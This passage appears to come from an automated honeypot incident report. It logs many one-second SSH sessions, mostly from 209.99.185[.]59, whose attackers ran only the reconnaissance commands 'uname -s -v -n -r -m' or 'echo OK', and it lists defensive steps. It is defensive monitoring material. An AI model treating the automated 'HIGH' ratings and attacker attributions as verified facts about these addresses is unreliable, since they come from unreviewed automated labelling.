| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:35:04` | `cowrie.session.connect` |
| `2026-06-27 09:35:04` | `cowrie.client.version` |
| `2026-06-27 09:35:04` | `cowrie.client.kex` |
| `2026-06-27 09:35:04` | `cowrie.login.success` |
| `2026-06-27 09:35:05` | `cowrie.session.params` |
| `2026-06-27 09:35:05` | `cowrie.command.input` |
| `2026-06-27 09:35:05` | `cowrie.log.closed` |
| `2026-06-27 09:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f43726e0d3cc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:36 |
| **Last Seen** | 2026-06-27 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:36:09` | `cowrie.session.connect` |
| `2026-06-27 09:36:09` | `cowrie.client.version` |
| `2026-06-27 09:36:09` | `cowrie.client.kex` |
| `2026-06-27 09:36:09` | `cowrie.login.success` |
| `2026-06-27 09:36:10` | `cowrie.session.params` |
| `2026-06-27 09:36:10` | `cowrie.command.input` |
| `2026-06-27 09:36:10` | `cowrie.log.closed` |
| `2026-06-27 09:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdc190d3e4cd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:37 |
| **Last Seen** | 2026-06-27 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:37:13` | `cowrie.session.connect` |
| `2026-06-27 09:37:13` | `cowrie.client.version` |
| `2026-06-27 09:37:13` | `cowrie.client.kex` |
| `2026-06-27 09:37:14` | `cowrie.login.success` |
| `2026-06-27 09:37:14` | `cowrie.session.params` |
| `2026-06-27 09:37:14` | `cowrie.command.input` |
| `2026-06-27 09:37:14` | `cowrie.log.closed` |
| `2026-06-27 09:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d91154306c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:38 |
| **Last Seen** | 2026-06-27 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:38:17` | `cowrie.session.connect` |
| `2026-06-27 09:38:17` | `cowrie.client.version` |
| `2026-06-27 09:38:17` | `cowrie.client.kex` |
| `2026-06-27 09:38:18` | `cowrie.login.success` |
| `2026-06-27 09:38:19` | `cowrie.session.params` |
| `2026-06-27 09:38:19` | `cowrie.command.input` |
| `2026-06-27 09:38:19` | `cowrie.log.closed` |
| `2026-06-27 09:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfd1cb9dc849

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:39 |
| **Last Seen** | 2026-06-27 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:39:22` | `cowrie.session.connect` |
| `2026-06-27 09:39:22` | `cowrie.client.version` |
| `2026-06-27 09:39:22` | `cowrie.client.kex` |
| `2026-06-27 09:39:22` | `cowrie.login.success` |
| `2026-06-27 09:39:23` | `cowrie.session.params` |
| `2026-06-27 09:39:23` | `cowrie.command.input` |
| `2026-06-27 09:39:23` | `cowrie.log.closed` |
| `2026-06-27 09:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d264070d6ef

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:40 |
| **Last Seen** | 2026-06-27 09:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:40:29` | `cowrie.session.connect` |
| `2026-06-27 09:40:29` | `cowrie.client.version` |
| `2026-06-27 09:40:29` | `cowrie.client.kex` |
| `2026-06-27 09:40:30` | `cowrie.login.success` |
| `2026-06-27 09:40:30` | `cowrie.session.params` |
| `2026-06-27 09:40:30` | `cowrie.command.input` |
| `2026-06-27 09:40:31` | `cowrie.log.closed` |
| `2026-06-27 09:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c5af42ae8f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:41 |
| **Last Seen** | 2026-06-27 09:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:41:36` | `cowrie.session.connect` |
| `2026-06-27 09:41:36` | `cowrie.client.version` |
| `2026-06-27 09:41:36` | `cowrie.client.kex` |
| `2026-06-27 09:41:36` | `cowrie.login.success` |
| `2026-06-27 09:41:37` | `cowrie.session.params` |
| `2026-06-27 09:41:37` | `cowrie.command.input` |
| `2026-06-27 09:41:37` | `cowrie.log.closed` |
| `2026-06-27 09:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61649ede4fe7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:42 |
| **Last Seen** | 2026-06-27 09:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:42:41` | `cowrie.session.connect` |
| `2026-06-27 09:42:41` | `cowrie.client.version` |
| `2026-06-27 09:42:41` | `cowrie.client.kex` |
| `2026-06-27 09:42:41` | `cowrie.login.success` |
| `2026-06-27 09:42:42` | `cowrie.session.params` |
| `2026-06-27 09:42:42` | `cowrie.command.input` |
| `2026-06-27 09:42:42` | `cowrie.log.closed` |
| `2026-06-27 09:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a694c46930c0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]92` |
| **First Seen** | 2026-06-27 09:43 |
| **Last Seen** | 2026-06-27 09:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:43:33` | `cowrie.session.connect` |
| `2026-06-27 09:43:33` | `cowrie.client.version` |
| `2026-06-27 09:43:33` | `cowrie.client.kex` |
| `2026-06-27 09:43:34` | `cowrie.login.success` |
| `2026-06-27 09:43:35` | `cowrie.session.params` |
| `2026-06-27 09:43:35` | `cowrie.command.input` |
| `2026-06-27 09:43:35` | `cowrie.log.closed` |
| `2026-06-27 09:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]92` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c7bb1da605

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:43 |
| **Last Seen** | 2026-06-27 09:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:43:44` | `cowrie.session.connect` |
| `2026-06-27 09:43:44` | `cowrie.client.version` |
| `2026-06-27 09:43:44` | `cowrie.client.kex` |
| `2026-06-27 09:43:45` | `cowrie.login.success` |
| `2026-06-27 09:43:45` | `cowrie.session.params` |
| `2026-06-27 09:43:45` | `cowrie.command.input` |
| `2026-06-27 09:43:46` | `cowrie.log.closed` |
| `2026-06-27 09:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a7f27a96605

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 09:44 |
| **Last Seen** | 2026-06-27 09:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:44:24` | `cowrie.session.connect` |
| `2026-06-27 09:44:25` | `cowrie.client.version` |
| `2026-06-27 09:44:25` | `cowrie.client.kex` |
| `2026-06-27 09:44:29` | `cowrie.login.success` |
| `2026-06-27 09:44:33` | `cowrie.session.params` |
| `2026-06-27 09:44:33` | `cowrie.command.input` |
| `2026-06-27 09:44:34` | `cowrie.log.closed` |
| `2026-06-27 09:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5385ec6b926f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:44 |
| **Last Seen** | 2026-06-27 09:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:44:49` | `cowrie.session.connect` |
| `2026-06-27 09:44:49` | `cowrie.client.version` |
| `2026-06-27 09:44:49` | `cowrie.client.kex` |
| `2026-06-27 09:44:49` | `cowrie.login.success` |
| `2026-06-27 09:44:50` | `cowrie.session.params` |
| `2026-06-27 09:44:50` | `cowrie.command.input` |
| `2026-06-27 09:44:50` | `cowrie.log.closed` |
| `2026-06-27 09:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-826574ca6206

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:45 |
| **Last Seen** | 2026-06-27 09:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:45:51` | `cowrie.session.connect` |
| `2026-06-27 09:45:51` | `cowrie.client.version` |
| `2026-06-27 09:45:51` | `cowrie.client.kex` |
| `2026-06-27 09:45:51` | `cowrie.login.success` |
| `2026-06-27 09:45:52` | `cowrie.session.params` |
| `2026-06-27 09:45:52` | `cowrie.command.input` |
| `2026-06-27 09:45:52` | `cowrie.log.closed` |
| `2026-06-27 09:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-719384a38cf7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:46 |
| **Last Seen** | 2026-06-27 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:46:55` | `cowrie.session.connect` |
| `2026-06-27 09:46:55` | `cowrie.client.version` |
| `2026-06-27 09:46:55` | `cowrie.client.kex` |
| `2026-06-27 09:46:56` | `cowrie.login.success` |
| `2026-06-27 09:46:57` | `cowrie.session.params` |
| `2026-06-27 09:46:57` | `cowrie.command.input` |
| `2026-06-27 09:46:57` | `cowrie.log.closed` |
| `2026-06-27 09:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4e606628b00

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:48 |
| **Last Seen** | 2026-06-27 09:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:48:03` | `cowrie.session.connect` |
| `2026-06-27 09:48:03` | `cowrie.client.version` |
| `2026-06-27 09:48:03` | `cowrie.client.kex` |
| `2026-06-27 09:48:03` | `cowrie.login.success` |
| `2026-06-27 09:48:04` | `cowrie.session.params` |
| `2026-06-27 09:48:04` | `cowrie.command.input` |
| `2026-06-27 09:48:04` | `cowrie.log.closed` |
| `2026-06-27 09:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f07fbf129eae

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:49 |
| **Last Seen** | 2026-06-27 09:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:49:11` | `cowrie.session.connect` |
| `2026-06-27 09:49:11` | `cowrie.client.version` |
| `2026-06-27 09:49:11` | `cowrie.client.kex` |
| `2026-06-27 09:49:11` | `cowrie.login.success` |
| `2026-06-27 09:49:12` | `cowrie.session.params` |
| `2026-06-27 09:49:12` | `cowrie.command.input` |
| `2026-06-27 09:49:12` | `cowrie.log.closed` |
| `2026-06-27 09:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c1cecf88816

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 09:49 |
| **Last Seen** | 2026-06-27 09:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:49:24` | `cowrie.session.connect` |
| `2026-06-27 09:49:24` | `cowrie.client.version` |
| `2026-06-27 09:49:24` | `cowrie.client.kex` |
| `2026-06-27 09:49:26` | `cowrie.login.success` |
| `2026-06-27 09:49:27` | `cowrie.session.params` |
| `2026-06-27 09:49:27` | `cowrie.command.input` |
| `2026-06-27 09:49:28` | `cowrie.log.closed` |
| `2026-06-27 09:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba42c65dfa00

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:50 |
| **Last Seen** | 2026-06-27 09:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:50:18` | `cowrie.session.connect` |
| `2026-06-27 09:50:18` | `cowrie.client.version` |
| `2026-06-27 09:50:18` | `cowrie.client.kex` |
| `2026-06-27 09:50:18` | `cowrie.login.success` |
| `2026-06-27 09:50:19` | `cowrie.session.params` |
| `2026-06-27 09:50:19` | `cowrie.command.input` |
| `2026-06-27 09:50:19` | `cowrie.log.closed` |
| `2026-06-27 09:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79997adb53a9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:51 |
| **Last Seen** | 2026-06-27 09:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:51:24` | `cowrie.session.connect` |
| `2026-06-27 09:51:24` | `cowrie.client.version` |
| `2026-06-27 09:51:24` | `cowrie.client.kex` |
| `2026-06-27 09:51:24` | `cowrie.login.success` |
| `2026-06-27 09:51:25` | `cowrie.session.params` |
| `2026-06-27 09:51:25` | `cowrie.command.input` |
| `2026-06-27 09:51:25` | `cowrie.log.closed` |
| `2026-06-27 09:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d20a6ee87de7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:52 |
| **Last Seen** | 2026-06-27 09:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:52:30` | `cowrie.session.connect` |
| `2026-06-27 09:52:30` | `cowrie.client.version` |
| `2026-06-27 09:52:30` | `cowrie.client.kex` |
| `2026-06-27 09:52:31` | `cowrie.login.success` |
| `2026-06-27 09:52:31` | `cowrie.session.params` |
| `2026-06-27 09:52:31` | `cowrie.command.input` |
| `2026-06-27 09:52:32` | `cowrie.log.closed` |
| `2026-06-27 09:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d93b450c923

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:53 |
| **Last Seen** | 2026-06-27 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:53:35` | `cowrie.session.connect` |
| `2026-06-27 09:53:35` | `cowrie.client.version` |
| `2026-06-27 09:53:36` | `cowrie.client.kex` |
| `2026-06-27 09:53:36` | `cowrie.login.success` |
| `2026-06-27 09:53:37` | `cowrie.session.params` |
| `2026-06-27 09:53:37` | `cowrie.command.input` |
| `2026-06-27 09:53:37` | `cowrie.log.closed` |
| `2026-06-27 09:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea59bc0ff04c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:54 |
| **Last Seen** | 2026-06-27 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:54:40` | `cowrie.session.connect` |
| `2026-06-27 09:54:40` | `cowrie.client.version` |
| `2026-06-27 09:54:40` | `cowrie.client.kex` |
| `2026-06-27 09:54:40` | `cowrie.login.success` |
| `2026-06-27 09:54:41` | `cowrie.session.params` |
| `2026-06-27 09:54:41` | `cowrie.command.input` |
| `2026-06-27 09:54:41` | `cowrie.log.closed` |
| `2026-06-27 09:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc118cf4f6c5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:55 |
| **Last Seen** | 2026-06-27 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:55:46` | `cowrie.session.connect` |
| `2026-06-27 09:55:46` | `cowrie.client.version` |
| `2026-06-27 09:55:47` | `cowrie.client.kex` |
| `2026-06-27 09:55:47` | `cowrie.login.success` |
| `2026-06-27 09:55:48` | `cowrie.session.params` |
| `2026-06-27 09:55:48` | `cowrie.command.input` |
| `2026-06-27 09:55:48` | `cowrie.log.closed` |
| `2026-06-27 09:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dca831ca1e1b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 09:55 |
| **Last Seen** | 2026-06-27 09:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:55:53` | `cowrie.session.connect` |
| `2026-06-27 09:55:55` | `cowrie.client.version` |
| `2026-06-27 09:55:55` | `cowrie.client.kex` |
| `2026-06-27 09:56:00` | `cowrie.login.success` |
| `2026-06-27 09:56:03` | `cowrie.session.params` |
| `2026-06-27 09:56:03` | `cowrie.command.input` |
| `2026-06-27 09:56:05` | `cowrie.log.closed` |
| `2026-06-27 09:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a7aad75024b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:56 |
| **Last Seen** | 2026-06-27 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:56:56` | `cowrie.session.connect` |
| `2026-06-27 09:56:56` | `cowrie.client.version` |
| `2026-06-27 09:56:56` | `cowrie.client.kex` |
| `2026-06-27 09:56:57` | `cowrie.login.success` |
| `2026-06-27 09:56:58` | `cowrie.session.params` |
| `2026-06-27 09:56:58` | `cowrie.command.input` |
| `2026-06-27 09:56:58` | `cowrie.log.closed` |
| `2026-06-27 09:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e104389940d7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 09:58 |
| **Last Seen** | 2026-06-27 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 09:58:03` | `cowrie.session.connect` |
| `2026-06-27 09:58:03` | `cowrie.client.version` |
| `2026-06-27 09:58:03` | `cowrie.client.kex` |
| `2026-06-27 09:58:03` | `cowrie.login.success` |
| `2026-06-27 09:58:04` | `cowrie.session.params` |
| `2026-06-27 09:58:04` | `cowrie.command.input` |
| `2026-06-27 09:58:04` | `cowrie.log.closed` |
| `2026-06-27 09:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
